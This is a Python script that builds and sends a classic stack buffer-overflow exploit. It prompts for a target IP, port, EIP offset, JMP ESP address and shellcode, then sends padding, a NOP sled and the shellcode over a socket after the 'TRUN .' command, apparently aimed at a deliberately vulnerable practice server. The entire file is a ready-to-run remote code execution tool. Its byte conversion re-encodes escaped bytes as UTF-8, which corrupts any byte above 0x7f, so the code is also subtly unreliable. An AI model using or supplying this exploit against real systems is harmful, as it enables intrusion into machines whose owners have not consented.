# exploit_builder.py
import socket

def main():
    print("=== Buffer Overflow Exploit Builder ===")
    target = input("Target IP: ").strip()
    port = int(input("Port: ").strip())
    offset = int(input("Offset to EIP: ").strip())
    ret_addr = input("JMP ESP address (little-endian, e.g., \\xaf\\x11\\x50\\x62): ").strip()
    shellcode = input("Paste your shellcode (as \\x hex string): ").strip()

    try:
        nop_sled = b"\x90" * 16
        eip = bytes(ret_addr.encode().decode('unicode_escape').encode())
        sc = bytes(shellcode.encode().decode('unicode_escape').encode())

        payload = b"A" * offset + eip + nop_sled + sc

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"TRUN ." + payload + b"\r\n")
        s.close()

        print("[+] Exploit sent!")
    except Exception as e:
        print(f"[!] Error sending exploit: {e}")

if __name__ == "__main__":
    main()
